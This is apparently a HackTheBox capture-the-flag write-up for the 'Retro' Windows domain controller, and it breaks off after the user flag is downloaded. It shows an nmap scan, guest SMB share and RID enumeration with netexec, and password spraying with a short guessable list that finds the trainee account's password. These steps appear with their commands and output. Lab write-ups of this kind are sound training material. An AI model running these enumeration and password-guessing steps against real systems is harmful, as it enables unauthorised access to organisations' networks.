# RETRO-HTB
Lot's of SMB exploration tips here

Nmap recon:
````
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-05 10:17 -0300
Nmap scan report for retro.htb (10.129.234.44)
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-05 13:17:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-11-05T12:59:51
|_Not valid after:  2027-11-05T12:59:51
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-11-05T12:59:51
|_Not valid after:  2027-11-05T12:59:51
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-11-05T12:59:51
|_Not valid after:  2027-11-05T12:59:51
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-11-05T12:59:51
|_Not valid after:  2027-11-05T12:59:51
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-05T13:19:07+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-11-05T13:18:48+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-11-04T13:08:59
|_Not valid after:  2027-05-06T13:08:59
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
50022/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50172/tcp open  msrpc         Microsoft Windows RPC
51089/tcp open  msrpc         Microsoft Windows RPC
51107/tcp open  msrpc         Microsoft Windows RPC
51123/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-05T13:18:48
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   166.94 ms 10.10.16.1
2   363.77 ms retro.htb (10.129.234.44)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.81 seconds
````

You can try ffufing but it shows nothing of interest. The bulk of enum'll be done almost totaly via smb.
Check guest shares via nxc:
````
 nxc smb 10.129.234.44 -u guest -p '' --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.44   445    DC               Notes                           
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ            
````
there are two non default shares: Notes and Trainees. Trainees can be read by guest. Get it with smbclient:
````
smbclient //10.129.234.44/Trainees -U guest ''
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 23 18:58:43 2023
  ..                                DHS        0  Wed Jun 11 11:17:10 2025
  Important.txt                       A      288  Sun Jul 23 19:00:13 2023

                4659711 blocks of size 4096. 1298002 blocks available
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> 
````

The contents of the files are:
````
└─$ cat Important.txt        
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards
````

There seems to be a Trainee user acc that all trainees use and it might have a weak password. Let's enum users bu PID:
````
┌──(spaz㉿kali)-[~/…/HTB/Windows/Retro/nmap]
└─$ netexec smb 10.129.234.44 -u guest -p '' --rid-brute
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
````

There actually is a trainee acc and also very interesting a computer acc called BANKING$. We can infer that BANKING$ is a computer acc because of the naming convention "$".
Computer acc generally have better permissions such as: Service Principal Names (SPNs). Kerberos-related authentication capabilities. Permissions over other AD objects. Access to resources granted specifically to that computer. In some configurations, computer accounts can also be exploited through AD certificate services, delegation, or other Kerberos-related weaknesses.
But for now let's focus on trainees as it might have a weaker password.
Let's make a list:
````
 cat passwords     
password
password123!
trainee
trainees
trainee123!
1234
12345
1234567890
qwerty
0000
00000
retro
traineeretro
retro123
````
Now we take this list of really simple passwords and pass it on to the trainee user:
````
└─$ netexec smb 10.129.234.44 -u Trainee -p passwords    
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [-] retro.vl\Trainee:password STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [-] retro.vl\Trainee:password123! STATUS_LOGON_FAILURE 
SMB         10.129.234.44   445    DC               [+] retro.vl\Trainee:trainee 
````
We hit trainee:trainee. Now check the shares for trainee:trainee
````
└─$ nxc smb 10.129.234.44 -u trainee -p trainee --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.44   445    DC               Notes           READ            
SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ            
````
We can read Notes:
````
└─$ smbclient //10.129.234.44/Notes -U trainee 'trainee'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Apr  9 00:12:49 2025
  ..                                DHS        0  Wed Jun 11 11:17:10 2025
  ToDo.txt                            A      248  Sun Jul 23 19:05:56 2023
  user.txt                            A       32  Wed Apr  9 00:13:01 2025

                4659711 blocks of size 4096. 1297586 blocks available
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> get user.txt
getting file \user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> ^C
````
Inside Notes we find the user.txt and a ToDo list:

